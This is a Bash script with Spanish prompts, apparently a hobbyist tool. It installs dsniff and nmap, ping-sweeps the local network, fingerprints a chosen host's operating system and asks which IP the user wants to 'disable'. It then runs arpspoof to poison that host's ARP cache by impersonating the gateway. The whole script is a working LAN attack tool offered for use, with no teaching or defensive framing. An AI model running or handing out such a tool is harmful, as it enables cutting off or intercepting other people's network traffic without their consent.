#!/bin/bash
function crtl_c(){
 echo ""
 echo -e "\e[31m[!] Saliendo...\e[0m"
 exit 1
}

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


#Ctrl+C
trap crtl_c INT

# Mostrar Banner
function banner(){
  echo -e "
 $redColour
  
  
             ████████████         
         ███████████
      ██████████
   ██████████
  ████████          ████████       
    ████          ████████████     
     ███        ███████████████                      ┳┳┓  ┓┏    
      ███      █████        █████                    ┃┃┃┓┏┣┫┏┓┏╋
       ███    █████  █    █  █████                   ┛ ┗┗┫┛┗┗┛┛┗
        ███   █████  ██  ██  █████                       ┛      
         ████ █████         █████       (\e[0;33m\033[1mHecho por: \e[0;34m\033[1mhttps://github.com/Riieiro\e[0m$redColour)
           ███ █████        ████  
            ███ █████     █████   
             ██████████████████   
              ███████████████████ 
  
  
  
  
  
  "
}
banner

# Instalar Requerimientos
function Requerimientos(){
    echo -e "${redColour}[+] Instalando el paquete dsniff y nmap..."
    sudo apt install dsniff &>/dev/null
    sudo apt install nmap &>/dev/null
}
Requerimientos

# Mostrar interfaces
function Interfaces(){
    echo -e -n "\n\n\e[0;33m\033[1m[+] Mostrando interfaces[+]\e[0m\n\n"
    ip a
    echo -e -n "\n\n\e[0;33m\033[1m[+] Elige una interfaz(Ejemplo:eth0): \e[0m"
    read interfaz
    echo ""
}
Interfaces

# Escaneo de hosts
function PingScan(){
  ip=$(ip a | grep ens33 | grep inet | awk '{print $2}')
  echo -e "\n ${yellowColour}[+] Mostrando hosts activos: "
  echo -e "\n${greenColour}$(nmap -sn ${ip} | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}') ${endColour}"



}
PingScan

# Escaneo de Sistema Operativo
function OScan(){
    echo -e -n "\n\e[0;33m\033[1m[+] Elige la ip que quieras deshabilitar:\e[0m "
    read kill_ip
    sudo nmap -O $kill_ip > MyHostOS.txt
    echo -e "\e[0;33m\033[1m[+] El dispositivo es un" "\e[31m$(grep "Running" MyHostOS.txt | awk -F 'Running: ' ' {print $2}')\e[0m"
    rm MyHostOS.txt
    echo -e "${redColour}[!] NOTA: Es posible que nmap no encuentre el sistema operativo[!]\e[0m"
}
OScan

# Envenenamiento de Arp
function ArpSpoofing(){
    echo -n -e "\e[0;33m\033[1m[+] ¿Quieres continuar?\e[0m(${greenColour}si\e[0m/${redColour}no\e[0m): "
    read respuesta
    if [ "$respuesta" = "si" ]; then
        puerta_enlace=$(echo $kill_ip | sed 's/\([0-9]\+\)$/1/g')
        sudo arpspoof -i "$interfaz" -t "$kill_ip" "$puerta_enlace"
    fi
}
ArpSpoofing
